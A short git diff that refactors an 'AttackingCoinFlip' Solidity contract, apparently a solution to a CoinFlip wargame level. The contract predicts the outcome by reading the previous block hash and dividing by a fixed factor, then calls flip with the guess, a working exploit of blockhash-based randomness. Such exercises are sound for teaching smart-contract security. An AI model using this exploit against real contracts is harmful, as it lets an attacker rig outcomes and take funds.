@@ -4,29 +4,18 @@ import "./CoinFlip.sol";
 import "hardhat/console.sol";
 
 contract AttackingCoinFlip {
-    address public contractAddress;
-    uint256 private lastHash;
-    uint256 private constant FACTOR =
-        57896044618658097711785492504343953926634992332820282019728792003956564819968;
-
+    CoinFlip private coinFlip;
+    
     constructor(address _contractAddress) {
-        contractAddress = _contractAddress;
+        coinFlip = CoinFlip(_contractAddress);
     }
 
-    function hackContract(CoinFlip coinFlip) external {
+    function hackContract() external {
+        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
         uint256 blockValue = uint256(blockhash(block.number - 1));
+        bool guess = blockValue / FACTOR == 1;
 
-        if (lastHash == blockValue) {
-            revert("SAME_BLOCK");
-        }
-
-        lastHash = blockValue;
-        uint256 result = blockValue / FACTOR;
-        bool answer = result == 1 ? true : false;
-        
-        console.log("Answer is %", answer);
-
-        coinFlip.flip(answer);
+        coinFlip.flip(guess);
     }
     
 }
